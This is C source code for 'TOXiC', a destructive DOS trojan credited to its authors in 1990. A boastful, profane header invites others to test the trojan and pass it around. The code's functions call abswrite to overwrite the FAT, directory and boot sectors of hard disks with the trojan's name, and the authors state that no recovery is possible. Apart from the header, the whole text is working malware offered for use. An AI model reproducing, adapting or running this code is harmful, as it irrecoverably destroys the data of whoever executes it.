/* TOXiC1 - TOXiC Trojan #1 - Programmed by Izzy Stradlin' and MiSERY/CPA  */
/* MiSERY1 is the name given to this trojan.  I programmed it, I name the  */
/* Mother fucker.  I hereby give all rights of this trojan to MiSERY/CPA.  */
/* If ya don't like it, TOUGH.  I Give ALL rights EXCEPT for the NAME to   */
/* CPA - eg. NOONE CAN CHANGE THE NAME OF THIS THING W/O MY PERMISSION AND */
/* LEAVE MY NAME IN IT.  The name must stay on, both my name and the name  */
/* of the trojan are copyrighted (c) 90 to Izzy Stradlin'                  */
/* ----------------------------------------------------------------------- */
/* Capt. - This isn't a Real Virus - It's a Trojan.  Sorry, still trying   */
/* to use something similar to ASM's int 21h; for DOSs features, then I'll */
/* Get going on Virii.  As is, this Destroys Boot/Fat/Dir on Most harddisks*/
/* and Well, there is so far no way that I know of that it can recover     */
/* what the disk lost, as it writes the trojan name over everything.  This */
/* SHOULD Go for BOTH FAT Tables, but I am not going to try it out.  Haha. */
/* You try it - Tell me how it works! all I know is that it got 6 of my    */
/* Flippin' floppies, damnit!  - Delete this bottom message to you after   */
/* Checking it out - Makes it look more professional.  Leave the top text  */
/* part in tact, just in case you want to pass it around.                  */
/* This is JUST A START.  They DO/WILL Get better - this is weak, but as I */
/* Said - no known recovery from it.                                       */
/* Oh, this looks for C: through H: */

#define   TROJAN_NAME  "TOXiC"    /* Trojan Name */

/* Procedures  */
void infect_fat();
void infect_dir();
void infect_boot();
void main();
/* Simple, eh? */


void infect_fat()
{
    int i;
    for (i=2; i<7; i++) {
        abswrite(i,0,2,TROJAN_NAME);
    }
}

void infect_dir()
{
    int i;
    for (i=2; i<7; i++) {
        abswrite(i,2,2,TROJAN_NAME);
    }
}

void infect_boot()
{
    int i;
    for (i=0; i<7; i++) {
        abswrite(i,4,2,TROJAN_NAME);
    }
}

void main()
{
    printf(TROJAN_NAME);
    infect_fat();
    infect_dir();
    infect_boot();
}

